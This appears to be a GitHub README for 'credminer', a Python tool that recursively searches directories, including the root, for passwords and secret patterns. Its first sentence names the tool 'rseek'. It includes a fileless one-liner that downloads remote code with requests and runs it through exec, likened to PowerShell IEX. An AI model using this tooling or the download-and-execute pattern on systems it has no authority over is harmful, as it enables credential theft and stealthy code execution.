# credminer

rseek is a Python recursive string and regex utility. It allows you to recursively search through all files with in a directory and any subdirectories and matches on a string or regex. When a match is found it prints what was matched and the full path of the file it was found in to the screen.

## usage

~~~

usage: credminer.py [-h] (-t TEXT | -r REGEX | -s) -d DIRECTORY [-f FILETYPE] [-a ADDREGEX]

options:
  -h, --help            show this help message and exit
  -t TEXT, --text TEXT  text or to search for
  -r REGEX, --regex REGEX
                        regular expression to match on
  -s, --secrets         Secrets to search for
  -d DIRECTORY, --directory DIRECTORY
                        The directory to search in
  -f FILETYPE, --filetype FILETYPE
                        The file extention to search for
  -a ADDREGEX, --addregex ADDREGEX
                        Adds a regex expression to the secrets file
~~~

      
## Examples

`python3 credminer.py -d / -f txt -t password`
This will search for any files under the root directory that are text files and contain the word password in them.

`python3 credminer.py -d / -f all -t password`
This will search for the word password in all files under the root directory

`python3 credminer.py -d / -f txt -r "(pass|password|code|key)"`
This will search for either the word password or passcode in text files that are under the root directory

I have also added an alternative script `invoke_credminer.py` which has been modified to allow you to run the script without saving it to disk. By default it runs the `get_secrets` function on the root directory, looking for all filetypes. However, this can be easily changed as there are several variables which have been added to pass the arguments to the script without having to pass them yourself. In a way this functions similarly to `IEX` in PowerShell. By changing the values of `text_search`, `regex_search`, `secret_search`, `filetype_search`, and `search_directory` it will automatically assign the arguments so all that has to be done to run the program on disk is `python3 credminer.py` but to run it without downloading it to disk you can run `python3 -c 'import requests; r = requests.get(url).text;exec(r)'`
